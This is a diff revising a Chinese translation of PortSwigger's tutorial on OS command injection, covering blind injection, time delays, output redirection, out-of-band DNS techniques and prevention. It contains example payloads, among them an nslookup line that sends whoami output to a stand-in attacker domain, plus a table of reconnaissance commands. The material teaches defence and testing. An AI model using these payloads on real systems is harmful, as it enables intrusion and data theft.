@@ -2,7 +2,7 @@
 description: '原文链接：https://portswigger.net/web-security/os-command-injection'
 ---
 
-# 操作系统命令注入
+# OS命令注入
 
 ## 什么是OS命令注入？
 
@@ -16,152 +16,172 @@ description: '原文链接：https://portswigger.net/web-security/os-command-inj
 
 ## 执行任意命令
 
-考虑一个购物应用程序，该应用程序使用户可以查看特定商店中某商品是否有库存。 该信息可通过如下网址访问：
+考虑一个购物应用程序，让用户可以查看某件商品在特定商店中是否有库存。 这一信息是通过一个URL访问的：
 
 ```text
-https://insecure-website.com/stockStatus?productID=381&storeID=29
+https://insecure-website.com/stockStatus?productID=381&storeID=29
 ```
 
-为了提供库存信息，应用程序必须查询各种旧系统。 由于历史原因，该功能是通过使用产品和存储ID作为参数调用shell命令来实现的：
+为了提供库存信息，应用程序必须查询各种旧系统。 由于历史原因，该功能是通过使用产品和存储的ID作为参数调用 shell 命令来实现的：
 
 ```text
 stockreport.pl 381 29
 ```
 
-此命令输出指定项目的库存状态，并返回给用户。
+此命令输出指定物品的库存状态，并返回给用户。
 
-由于该应用程序无法防御OS命令注入，因此攻击者可以提交以下输入以执行任意命令：
+由于该应用程序没有实现对操作系统命令注入的防御，攻击者可以提交以下输入来执行一个任意命令：
 
 ```text
 & echo aiwefwlguh &
 ```
 
-如果此输入是在productID参数中提交的，那么应用程序执行的命令是：
+如果这个输入是在`productID`参数中提交的，那么应用程序执行的命令是：
 
 ```text
 stockreport.pl & echo aiwefwlguh & 29
 ```
 
-echo命令只是使提供的字符串在输出中回显，并且是测试某些类型的OS命令注入的有用方法。 ＆字符是shell命令分隔符，因此执行的实际上是一个接一个的三个独立命令。 因此，返回给用户的输出为：
+`echo`命令只是使提供的字符串在输出中回显，它是测试某些类型的 OS 命令注入的有用方法。 `&`字符是 shell 命令分隔符，因此执行的实际上是一个接一个的三个独立命令。 因此，返回给用户的输出为：
 
 ```text
-Error - productID was not providedaiwefwlguh29: command not found
+Error - productID was not provided
+aiwefwlguh
+29: command not found
 ```
 
 输出的三行表明：
 
-* 原始的stockreport.pl命令在没有预期参数的情况下执行，因此返回了错误消息。
-* 执行注入的echo命令，并且在输出中回显提供的字符串。
-* 原始参数29作为命令执行，从而导致错误。
+* 原始的`stockreport.pl`命令在没有预期参数的情况下执行，因此返回了一个错误消息。
+* 注入的`echo`命令被执行，并且提供的字符串在输出中回显。
+* 原先的参数`29`被作为命令执行，这导致了一个错误。
 
-通常，将附加命令分隔符＆放置在注入命令之后是很有用的，因为这会将注入命令与注入点后面的内容分开。 这减少了随后发生的事情将阻止注入的命令执行的可能性。
+将额外的命令分隔符`&`放在注入的命令之后通常是很有用的，因为它将注入命令与注入点后面的内容分开。 这就减少了后面的阻止注入命令执行操作的可能性。
 
-**实验室**[OS命令注入，简单案例](http://portswigger.cn/academy/subpage/allTopics/all-5.html#)
+{% hint style="warning" %}
+**实验：**[OS 命令注入，简单案例](https://portswigger.net/web-security/os-command-injection/lab-simple)
+{% endhint %}
 
 ## 有用的命令
 
-当您确定了OS命令注入漏洞后，通常可以执行一些初始命令来获取有关您受到破坏的系统的信息。 以下是在Linux和Windows平台上有用的一些命令的摘要：
+当你确定了一个 OS 命令注入漏洞后，执行一些初始命令以获得被你入侵的系统的信息通常是有用的。 以下是在 Linux 和 Windows 平台上有用的一些命令摘要：
 
-| 命令目的 | Linux | Windows |
+| 命令的用途 | Linux | Windows |
 | :--- | :--- | :--- |
 | 当前用户名 | `whoami` | `whoami` |
 | 操作系统 | `uname -a` | `ver` |
 | 网络配置 | `ifconfig` | `ipconfig /all` |
 | 网络连接 | `netstat -an` | `netstat -an` |
-| 运行过程 | `ps -ef` | `任务列表` |
+| 运行的进程 | `ps -ef` | `tasklist` |
 
-## 盲操作系统命令注入漏洞
+## 操作系统命令盲注漏洞
 
-OS命令注入的许多实例都是盲目的漏洞。 这意味着应用程序不会在其HTTP响应中返回命令的输出。 盲目漏洞仍然可以被利用，但是需要不同的技术。
+OS 命令注入的许多例子都是盲注漏洞。 这意味着应用程序不会在其 HTTP 响应中返回命令的输出。 盲注漏洞仍然可以被利用，但是需要不同的技术。
 
-考虑一个允许用户提交有关该站点的反馈的网站。 用户输入他们的电子邮件地址和反馈消息。 然后，服务器端应用程序会向站点管理员生成一封包含反馈的电子邮件。 为此，它使用提交的详细信息调出邮件程序。 例如：
+考虑一个网站允许用户提交有关该站点的反馈。 用户输入他们的电子邮件地址和反馈消息。 然后，服务器端应用程序生成一封包含反馈的电子邮件发到网站管理员。 为此，它要把提交的详细信息调用给邮件程序。 例如：
 
 ```text
 mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
 ```
 
-mail命令的输出（如果有）不会在应用程序的响应中返回，因此使用echo有效负载将无效。 在这种情况下，您可以使用多种其他技术来检测和利用漏洞。
+`mail`命令的输出（如果有）不会在应用程序的响应中返回，因此使用`echo` payload 将无效。 在这种情况下，你可以使用多种其他技术来检测和利用漏洞。
 
-### 使用时间延迟检测盲注OS命令注入
+### 使用时间延迟检测OS命令盲注
 
-您可以使用注入的命令来触发时间延迟，从而允许您根据应用程序响应的时间来确认命令已执行。 ping命令是执行此操作的有效方法，因为它使您可以指定要发送的ICMP数据包的数量，从而指定该命令运行所花费的时间：
+你可以使用一个注入命令来触发一个时间延迟，从而让你根据应用程序响应的时间来确认命令是否被执行。 `ping`命令是执行此操作的有效方法，因为它可以让你指定要发送的 ICMP 数据包的数量，从而指定命令运行所花费的时间：
 
 ```text
 & ping -c 10 127.0.0.1 &
 ```
 
-此命令将导致应用程序ping其环回网络适配器10秒钟。
+此命令将导致应用程序`ping`其环回网络适配器10次。
 
-**实验室**[带有延迟的盲OS命令注入](http://portswigger.cn/academy/subpage/allTopics/all-5.html#detecting-blind-os-command-injection-using-time-delays)
+{% hint style="warning" %}
+**实验：**[带时间延迟的 OS 命令盲注](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)
+{% endhint %}
 
-### 通过重定向输出来利用盲OS命令注入
+### 通过重定向输出来利用OS命令盲注
 
-您可以将注入命令的输出重定向到web根目录下的文件中，然后可以使用浏览器进行检索。 例如，如果应用程序从文件系统位置/var/www/static提供静态资源，则可以提交以下输入：
+你可以将注入命令的输出重定向到 web 根目录下的一个文件中，然后就可以用浏览器进行取回。 例如，如果应用程序从`/var/www/static`位置提供静态资源，那么可以提交以下输入：
 
 ```text
 & whoami > /var/www/static/whoami.txt &
 ```
 
-&gt;字符将whoami命令的输出发送到指定文件。 然后，您可以使用浏览器获取[https://vulnerable-website.com/whoami.txt来检索文件，并查看注入命令的输出。](https://vulnerable-website.com/whoami.txt来检索文件，并查看注入命令的输出。)
+`>`字符将`whoami`命令的输出发送到指定文件中。 然后，你可以使用浏览器获取`https://vulnerable-website.com/whoami.txt`来获取文件，并查看注入命令的输出。
 
-使用带外（OAST）技术利用盲OS命令注入
+{% hint style="warning" %}
+**实验：**[带重定向输出的 OS 命令盲注](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+{% endhint %}
 
-您可以使用注入的命令，通过OAST技术触发与您控制的系统的带外网络交互。 例如：
+### 使用带外（OAST）技术利用盲OS命令注入
+
+你可以使用一个注入的命令，通过 OAST 技术触发与你控制的系统的带外网络交互。 例如：
 
 ```text
 & nslookup kgji2ohoyw.web-attacker.com &
 ```
 
-此有效负载使用nslookup命令对指定域进行DNS查找。 攻击者可以监视是否发生了指定的查找，从而检测到命令已成功注入。
+此 payload 使用`nslookup`命令对指定域进行 DNS 查找。 攻击者可以监视到是否发生了指定的查找，从而检测命令已成功注入。
 
-带外通道还提供了一种从注入的命令中提取输出的简便方法：
+{% hint style="warning" %}
+**实验：**[带外交互的 OS 命令盲注](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)
+{% endhint %}
+
+带外通道还提供了一种简单的方法来从注入的命令中提取输出：
 
 ```text
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
 ```
 
-这将导致对包含whoami命令结果的攻击者域的DNS查找：
+这将导致对攻击者的域名进行 DNS 查找，其中包含`whoami`命令的结果。
 
 ```text
 wwwuser.kgji2ohoyw.web-attacker.com
 ```
 
-**实验室**[带带外数据渗透的盲OS命令注入](http://portswigger.cn/academy/subpage/allTopics/all-5.html#)
+{% hint style="warning" %}
+**实验：**带外数据渗出的 OS 命令盲注
+{% endhint %}
 
-## 注入OS命令的方式
+## 注入 OS 命令的方式
 
-可以使用各种shell元字符来执行OS命令注入攻击。
+可以使用各种 shell 元字符来执行 OS 命令注入攻击。
 
-许多字符用作命令分隔符，使命令可以链接在一起。 以下命令分隔符在Windows和基于Unix的系统上均可使用：
+一些字符可以作为命令的分隔符，使命令可以被链接起来。 以下命令分隔符在 Windows 和基于 Unix 的系统中均可使用：
 
 * `&`
 * `&&`
 * `|`
 * `||`
 
-以下命令分隔符仅在基于Unix的系统上工作：
+以下命令分隔符仅在基于 Unix 的系统中工作：
 
 * `;`
-* Newline \(`0x0a` or `\n`\)
+* `0x0a` or `\n`
 
-在基于Unix的系统上，您还可以使用反引号或美元字符在原始命令内对注入的命令执行内联执行：
+在基于 Unix 的系统中，你还可以使用反引号或 dollar 字符，在原始命令内对注入的命令内联执行：
 
-* \`\`\` 注入命令 \`\`\`
-* `$(` 注入命令 `)`
+* ````` 注入的命令 `````
+* `$(` 注入的命令 `)`
 
-请注意，不同的shell元字符具有细微不同的行为，这可能会影响它们是否在某些情况下起作用，以及它们是否允许带内检索命令输出或仅对盲目利用有用。
+请注意，不同的 shell 元字符具有细微的不同行为，这可能会影响它们在某些情况下是否起作用，以及它们是否允许带内检索命令输出或仅用于盲注利用。
 
-有时，您控制的输入会出现在原始命令的引号中。 在这种情况下，需要先使用引号终止上下文（使用“或”），然后再使用适当的shell元字符来插入新命令。
+有时，你控制的输入会出现在原始命令的引号内。 这种情况下，在使用合适的 shell 元字符注入新命令之前，需要终止带引号的上下文\(使用`"`或`'`\)。
 
 ## 如何防止OS命令注入攻击
 
-到目前为止，防止OS命令注入漏洞的最有效方法是永远不要从应用程序层代码中调用OS命令。 几乎在每种情况下，都有使用更安全的平台API来实现所需功能的替代方法。
+到目前为止，防止 OS 命令注入漏洞最有效的方法是，永远不要从应用程序层代码中调用 OS 命令。 几乎在每种情况下，都有使用更安全的平台 API 来实现所需功能的替代方法。
 
-如果认为无法避免使用用户提供的输入来调用OS命令，则必须执行强输入验证。 有效验证的一些示例包括：
+如果认为无法避免使用用户提供的输入来调用 OS 命令，则必须进行强输入验证。一些有效验证的例子包括：
 
 * 根据允许值的白名单进行验证。
 * 验证输入是否为数字。
 * 验证输入仅包含字母数字字符，不包含其他语法或空格。
 
-切勿尝试通过转义shell元字符来清理输入。 实际上，这太容易出错，容易被熟练的攻击者绕开。
+不要试图通过转义 shell 元字符来清理输入。 实际中，这太容易出错，而且容易被熟练的攻击者绕过。
+
+> **阅读更多**
+>
+> [使用 Burp Suite 的 Web 漏洞扫描器找到 OS 命令注入漏洞](https://portswigger.net/burp/vulnerability-scanner)
 
